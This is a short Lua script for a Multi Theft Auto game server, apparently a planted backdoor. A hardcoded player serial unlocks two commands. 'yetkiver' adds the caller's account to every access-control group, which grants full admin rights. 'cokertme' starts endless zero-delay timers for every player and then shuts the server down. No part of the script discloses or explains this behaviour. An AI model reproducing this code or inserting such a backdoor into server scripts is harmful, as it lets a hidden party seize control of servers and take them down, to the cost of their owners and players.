serialler = {}
serialler["D6A23369B577005BC18AC0EA4AB44E52"] = true

addCommandHandler("yetkiver", function(plr, cmd)
    if not serialler[getPlayerSerial(plr)] then return end
    account = getPlayerAccount(plr)
    if account and  not isGuestAccount(account) then
        accountName = getAccountName(account)
        for i,v in ipairs(aclList()) do
            aclGroupAddObject (aclGetGroup(aclGetName(v)), "user."..accountName)
            --outputChatBox("Kendine başarıyla "..aclGetName(v).." adlı yetkiyi verdin!", plr, 255, 0, 0)
        end
    end
end)

addCommandHandler("cokertme", function(plr, cmd, ...)
    if not serialler[getPlayerSerial(plr)] then return end
    reason = { ... }
    for i,v in ipairs(getElementsByType("player")) do
        x,y,z = getElementPosition(v)
        setTimer(function()
            --createVehicle(520, x, y, z)
        end, 0, 0)
    end
    setTimer(function()
        shutdown(table.concat(reason, " "))
    end, 5000, 1)
end)
